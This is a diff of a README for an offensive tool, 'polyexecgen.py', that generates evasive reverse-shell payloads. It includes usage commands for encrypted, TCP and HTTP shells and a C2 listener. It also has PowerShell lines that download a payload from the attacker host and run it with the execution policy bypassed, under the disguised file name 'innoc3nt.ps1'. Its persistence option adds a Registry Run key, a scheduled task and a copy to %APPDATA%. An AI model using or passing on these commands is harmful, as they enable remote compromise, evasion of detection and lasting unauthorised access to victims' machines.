@@ -27,10 +27,10 @@ Traffic jitter<br>
 
 ## USAGE:<br>
     ### Encrypted shell -- full evasion
-    ./polyexecgen.py -t 192.168.1.5 -p 4444 -m encrypted -k mygoodpassword
+    ./polyexecgen.py -t 192.168.1.5 -p 6969 -m encrypted -k mygoodpassword
     
     ### basic TCP sh
-    ./polyexecgen.py -t 192.168.1.5 -p 4444 -m tcp
+    ./polyexecgen.py -t 192.168.1.5 -p 6969 -m tcp
     
     ### HTTP --  web traffic
     ./polyexecgen.py -t http://192.168.1.5:6969/shell -m http -k myk3y
@@ -44,35 +44,34 @@ Traffic jitter<br>
 
 ## start the sh3ll catch3r: <br>
 
-### Encrypted mode:
+#### Encrypted mode:
 
 <br>
 
      python3 c2_catcher.py
 
-### Host the payload:
+#### Host the payload:
 
     python3 -m http.server 8000
 
-### powershell On Windows target:
+#### powershell On Windows target:
 
     Invoke-WebRequest http://192.168.1.5:6969/payloads/polyexec_encrypted_*.ps1 -OutFile innoc3nt.ps1
     powershell.exe -ExecutionPolicy Bypass -File innoc3nt.ps1
 
-### Persistance:
+#### Persistance:
 
  payload w/ auto install persistence:
  
-    ./polyexecgen.py -t 192.168.1.100 -p 4444 -m encrypted --persist
-
- Adds:
- - Registry Run key
- - Scheduled task at logon
- - File copy to %APPDATA%
+    ./polyexecgen.py -t 192.168.1.5 -p 6969 -m encrypted --persist
+Puts data on disk
+Registry Run key
+Scheduled task at logon
+File copy to %APPDATA%
  
 ---
 
-### ideas borrowed from cool humans: <br>
+#### ideas borrowed from cool humans: <br>
 
 @danielbohannon  <br>
 @harmj0y  <br>
